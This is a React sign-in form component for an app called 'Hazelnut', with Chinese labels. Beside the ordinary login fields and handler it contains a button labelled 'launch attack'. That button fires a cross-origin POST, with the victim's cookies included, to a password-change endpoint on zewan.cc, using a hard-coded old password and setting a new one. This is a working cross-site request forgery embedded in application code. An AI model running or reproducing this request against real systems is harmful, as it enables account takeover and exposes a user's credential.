import { TextField, Button, Typography, Link } from '@material-ui/core'
import { makeStyles } from '@material-ui/core/styles'
import { useDispatchStore } from 'store'
import { useForm } from 'react-hook-form'
import { login } from 'api/auth'
import { useSnackbar } from 'notistack'
import { Link as RouterLink } from 'react-router-dom'

const useStyles = makeStyles((theme) => ({
  title: {
    alignSelf: 'normal',
    width: '100%',
    fontWeight: 'bolder',
    marginTop: theme.spacing(10),
  },
  form: {
    width: '100%',
    marginTop: theme.spacing(1),
  },
  formBtn: {
    borderRadius: theme.shape.borderRadius * 8,
    height: '50px',
    marginTop: theme.spacing(2),
  },
  link: {
    width: '100%',
    marginTop: theme.spacing(4),
    textAlign: 'center',
  },
}))

function SignInForm() {
  const dispatch = useDispatchStore()
  const { enqueueSnackbar } = useSnackbar()
  const {
    register,
    handleSubmit,
    formState: { errors },
  } = useForm()
  const classes = useStyles()

  const username = register('username', {
    required: { value: true, message: '用户名不能为空' },
  })
  const password = register('password', {
    required: { value: true, message: '密码不能为空' },
  })

  const onSubmit = (data) => {
    login(data).then((res) => {
      if (res.data.success) {
        enqueueSnackbar(res.data.message, { variant: 'success' })
        dispatch({ type: 'login', data: res.data.userId })
      } else {
        enqueueSnackbar(res.data.message, { variant: 'warning' })
      }
    })
  }

  return (
    <>
      <Typography component='h1' variant='h4' className={classes.title}>
        登录Hazelnut
      </Typography>
      <form onSubmit={handleSubmit(onSubmit)} className={classes.form}>
        <TextField
          label='用户名'
          margin='normal'
          fullWidth
          onChange={username.onChange}
          name={username.name}
          inputRef={username.ref}
          error={!!errors.username}
          helperText={errors.username && errors.username.message}
          variant='outlined'
        />
        <TextField
          label='密码'
          margin='normal'
          fullWidth
          onChange={password.onChange}
          name={password.name}
          inputRef={password.ref}
          error={!!errors.password}
          helperText={errors.password && errors.password.message}
          variant='outlined'
        />
        <Button
          type='submit'
          fullWidth
          variant='contained'
          color='primary'
          className={classes.formBtn}
          size='large'
        >
          登录
        </Button>
        <Button
          fullWidth
          variant='contained'
          color='primary'
          className={classes.formBtn}
          size='large'
          onClick={() => {
            fetch('https://zewan.cc/api/qs/user/change/password/', {
              body: JSON.stringify({
                old_password: 'zhouqin',
                new_password_1: '123456',
                new_password_2: '123456',
              }),
              cache: 'no-cache',
              credentials: 'include',
              headers: {
                'content-type': 'application/json',
              },
              method: 'POST',
              mode: 'cors',
              referrer: 'no-referrer',
            }).then((res) => console.log(res))
          }}
        >
          发起攻击
        </Button>
      </form>
      <Link
        variant='body1'
        component={RouterLink}
        to='/signup'
        className={classes.link}
      >
        Don't have an account? Sign Up
      </Link>
    </>
  )
}

export default SignInForm
